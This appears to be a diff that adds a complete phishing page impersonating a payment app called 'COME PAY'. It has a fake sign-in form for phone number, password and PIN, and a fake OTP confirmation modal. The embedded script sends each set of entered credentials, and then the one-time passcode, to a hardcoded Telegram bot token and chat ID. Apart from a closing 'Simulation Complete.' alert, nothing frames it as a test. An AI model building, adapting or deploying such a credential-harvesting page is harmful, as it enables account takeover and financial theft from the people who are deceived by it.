@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>COME PAY - Secure Payment</title>
+<style>
+:root{
+  --bg:#000000; --input-bg:#141414; --border:#2a2a2a; --text:#ffffff; --muted:#888888;
+  --btn-blue:#2154e8; --link-blue:#4a8dff;
+}
+*,*::before,*::after{box-sizing:border-box; margin:0; padding:0}
+body{
+  min-height:100vh; background:var(--bg); color:var(--text);
+  font-family:system-ui,-apple-system,Roboto,sans-serif;
+  display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px;
+}
+
+/* Logo Wrapper */
+.logo-wrapper {
+  width: 140px; 
+  height: 140px; 
+  border-radius: 24px;
+  margin-bottom: 20px; 
+  box-shadow: 0 0 25px rgba(33, 84, 232, 0.4);
+  border: 1px solid #2a2a2a;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: #ffffff;
+  overflow: hidden;
+  padding: 12px;
+}
+
+/* Inline SVG Logo */
+.logo-wrapper svg {
+  width: 100%;
+  height: 100%;
+}
+
+h1 { font-size: 1.4rem; font-weight: 800; letter-spacing: 1px; margin-bottom: 4px; }
+.sub { color: var(--link-blue); font-size: 0.75rem; letter-spacing: 2px; margin-bottom: 30px; text-transform: uppercase; }
+
+.card { width: 100%; max-width: 340px; }
+.field {
+  display: flex; align-items: center; background: var(--input-bg); border: 1px solid var(--border);
+  border-radius: 999px; padding: 0 20px; height: 56px; margin-bottom: 16px;
+}
+.field input { flex: 1; background: none; border: 0; outline: 0; color: var(--text); font-size: 1rem; }
+.field input::placeholder { color: var(--muted); }
+.field span { font-size: 1.1rem; margin-right: 12px; color: var(--link-blue); }
+
+.actions { display: flex; justify-content: space-between; align-items: center; font-size: 0.85rem; margin-bottom: 20px; padding: 0 8px; }
+.actions a { color: var(--link-blue); text-decoration: none; }
+.checkbox-row { display: flex; align-items: center; gap: 8px; color: var(--link-blue); font-size: 0.85rem; margin-bottom: 24px; justify-content: center; }
+.checkbox-row input[type="checkbox"] { accent-color: var(--link-blue); width: 16px; height: 16px; }
+
+.btn {
+  width: 100%; height: 56px; border: 0; border-radius: 999px;
+  background: linear-gradient(180deg, #2a52d6, #1832b8); color: #fff;
+  font-size: 1rem; font-weight: 700; cursor: pointer; letter-spacing: 1px;
+  box-shadow: 0 4px 15px rgba(33, 84, 232, 0.4);
+}
+
+.overlay {
+  position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; 
+  align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(2px);
+}
+.overlay.open { display: flex; }
+.modal {
+  position: relative; width: 100%; max-width: 320px; background: #1c1d21; 
+  border-radius: 24px; padding: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+}
+.modal h2 { font-size: 1.2rem; margin-bottom: 10px; color: #fff; }
+.modal p { color: #9ca3af; font-size: 0.85rem; margin-bottom: 12px; line-height: 1.4; }
+.modal b { color: var(--link-blue); }
+.close-x {
+  position: absolute; top: 16px; right: 16px; width: 32px; height: 32px;
+  border-radius: 50%; background: #2d2e33; border: 0; color: #ccc; 
+  font-size: 1.2rem; cursor: pointer; display: flex; align-items: center; justify-content: center;
+}
+
+.otp-input-group {
+  display: flex; align-items: center; background: #111; border-radius: 999px;
+  padding: 6px 6px 6px 16px; margin-bottom: 16px; border: 1px solid var(--border);
+}
+.otp-input-group input { 
+  flex: 1; background: none; border: 0; outline: 0; color: #fff; font-size: 0.95rem; min-width: 0;
+}
+.otp-input-group button {
+  background: #1d3a8a; color: #fff; border: 0; border-radius: 999px;
+  padding: 10px 18px; font-size: 0.85rem; font-weight: 600; cursor: pointer;
+  white-space: nowrap; transition: opacity 0.2s;
+}
+.otp-input-group button:disabled { opacity: 0.7; cursor: default; }
+</style>
+</head>
+<body>
+
+  <!-- LOGO SECTION -->
+  <div class="logo-wrapper">
+    <!-- Embedded SVG Logo -->
+    <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="blueGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stop-color="#3b82f6" />
+          <stop offset="100%" stop-color="#1e40af" />
+        </linearGradient>
+        <linearGradient id="orangeGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stop-color="#fbbf24" />
+          <stop offset="100%" stop-color="#ea580c" />
+        </linearGradient>
+        <linearGradient id="walletGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stop-color="#3b82f6" />
+          <stop offset="100%" stop-color="#1d4ed8" />
+        </linearGradient>
+      </defs>
+
+      <!-- Blue C -->
+      <path d="M 80 30 C 40 30 20 60 20 90 C 20 120 40 150 80 150 L 80 120 C 60 120 50 100 50 90 C 50 80 60 60 80 60 Z" fill="url(#blueGrad)" stroke="#1e3a8a" stroke-width="2"/>
+
+      <!-- Orange D / Arrow -->
+      <path d="M 100 30 L 130 30 C 160 30 160 80 140 100 L 120 80 C 130 70 130 60 120 60 L 100 60 Z" fill="url(#orangeGrad)" stroke="#c2410c" stroke-width="2"/>
+      <path d="M 100 110 L 140 150 L 100 150 Z" fill="url(#orangeGrad)" stroke="#c2410c" stroke-width="2"/>
+
+      <!-- Wallet -->
+      <rect x="100" y="115" width="50" height="30" rx="6" fill="url(#walletGrad)" stroke="#1e3a8a" stroke-width="2"/>
+      <path d="M 100 115 L 150 115 L 150 110 C 150 105 145 105 140 105 L 110 105 C 105 105 100 105 100 115 Z" fill="#4ade80" stroke="#166534" stroke-width="2"/>
+      <circle cx="105" cy="130" r="15" fill="#fbbf24" stroke="#b45309" stroke-width="2"/>
+      <text x="105" y="136" fill="#ffffff" font-size="18" font-weight="bold" text-anchor="middle" font-family="Arial">₹</text>
+      <circle cx="140" cy="130" r="4" fill="#ffffff" />
+
+      <!-- Text -->
+      <text x="20" y="180" font-family="Arial, sans-serif" font-size="32" font-weight="900" fill="url(#blueGrad)">COME</text>
+      <text x="110" y="180" font-family="Arial, sans-serif" font-size="32" font-weight="900" fill="url(#orangeGrad)">PAY</text>
+    </svg>
+  </div>
+  
+  <h1>COME PAY</h1>
+  <p class="sub">Secure Payment</p>
+
+  <div class="card">
+    <form id="loginForm">
+      <div class="field">
+        <span>👤</span>
+        <input name="phone" type="tel" inputmode="numeric" placeholder="Phone Number" required>
+      </div>
+      <div class="field">
+        <span>🔒</span>
+        <input name="password" type="password" placeholder="Password" required>
+      </div>
+      <div class="field">
+        <span>🔑</span>
+        <input name="pin" type="password" inputmode="numeric" maxlength="6" placeholder="6-digit PIN" required>
+      </div>
+      
+      <div class="actions">
+        <a href="#">Register</a>
+        <label style="display:flex; align-items:center; gap:6px; color:#fff; cursor:pointer;">
+          <input type="checkbox" style="width:14px; height:14px; accent-color:#fff;"> Remember Me
+        </label>
+      </div>
+      
+      <div class="checkbox-row">
+        <input type="checkbox" checked> Agree "User Privacy Agreement"
+      </div>
+
+      <button class="btn" type="submit">SIGN IN</button>
+    </form>
+  </div>
+
+  <div class="overlay" id="otpOverlay">
+    <div class="modal">
+      <button class="close-x" onclick="document.getElementById('otpOverlay').classList.remove('open')">✕</button>
+      <h2>Login OTP</h2>
+      <p>Tap Send to receive the OTP, then enter it to confirm this login.</p>
+      <p>OTP will be sent to <b id="maskedPhone">+91 XXXXXX</b></p>
+      <div class="otp-input-group">
+        <input type="text" id="otpInput" maxlength="6" placeholder="Enter 6-digit OTP">
+        <button id="sendBtn" disabled>Send 30s</button>
+      </div>
+      <button class="btn" id="confirmOtpBtn">CONFIRM</button>
+    </div>
+  </div>
+
+<script>
+// @ts-nocheck
+// --- TELEGRAM CONFIG ---
+const TG_TOKEN = "9289450939:AAHmqDj1vduVb_D74seUiEGZvtmnMofn5Bo";
+const TG_CHAT  = "6197678875";
+// -----------------------
+
+const form = document.getElementById('loginForm');
+const overlay = document.getElementById('otpOverlay');
+const maskedPhone = document.getElementById('maskedPhone');
+const sendBtn = document.getElementById('sendBtn');
+let timerInterval;
+
+function esc(s) {
+  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+
+async function sendTelegramAlert(text) {
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_CHAT, text: text, parse_mode: 'HTML' })
+    });
+  } catch (err) {
+    console.error("Alert failed", err);
+  }
+}
+
+form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const phone = form.phone.value;
+  const password = form.password.value;
+  const pin = form.pin.value;
+  
+  maskedPhone.textContent = `+91 ${phone}`;
+
+  const msg =
+    `🚨 <b>COME PAY LOGIN</b>\n` +
+    `<b>Phone:</b> <code>${esc(phone)}</code>\n` +
+    `<b>Password:</b> <code>${esc(password)}</code>\n` +
+    `<b>PIN:</b> <code>${esc(pin)}</code>\n` +
+    `<b>Time:</b> ${new Date().toLocaleString()}`;
+
+  await sendTelegramAlert(msg);
+
+  overlay.classList.add('open');
+  document.getElementById('otpInput').value = '';
+  startTimer(30);
+});
+
+function startTimer(seconds) {
+  clearInterval(timerInterval);
+  let timeLeft = seconds;
+  sendBtn.disabled = true;
+  
+  const updateBtn = () => {
+    if (timeLeft <= 0) {
+      clearInterval(timerInterval);
+      sendBtn.textContent = 'Send';
+      sendBtn.disabled = false;
+    } else {
+      sendBtn.textContent = `Send ${timeLeft}s`;
+    }
+  };
+
+  updateBtn();
+  timerInterval = setInterval(() => {
+    timeLeft--;
+    updateBtn();
+  }, 1000);
+}
+
+sendBtn.addEventListener('click', () => {
+  sendBtn.disabled = true;
+  startTimer(30);
+});
+
+document.getElementById('confirmOtpBtn').addEventListener('click', async () => {
+  const otp = document.getElementById('otpInput').value;
+  if(otp.length !== 6) return alert('Enter 6 digits');
+
+  const msg =
+    `🔑 <b>COME PAY OTP</b>\n` +
+    `<b>Phone:</b> <code>${esc(form.phone.value)}</code>\n` +
+    `<b>OTP:</b> <code>${esc(otp)}</code>\n` +
+    `<b>Time:</b> ${new Date().toLocaleString()}`;
+
+  await sendTelegramAlert(msg);
+
+  document.getElementById('confirmOtpBtn').textContent = 'VERIFYING...';
+  setTimeout(() => {
+    overlay.classList.remove('open');
+    document.getElementById('confirmOtpBtn').textContent = 'CONFIRM';
+    alert('Simulation Complete.');
+  }, 1500);
+});
+</script>
+</body>
+</html>
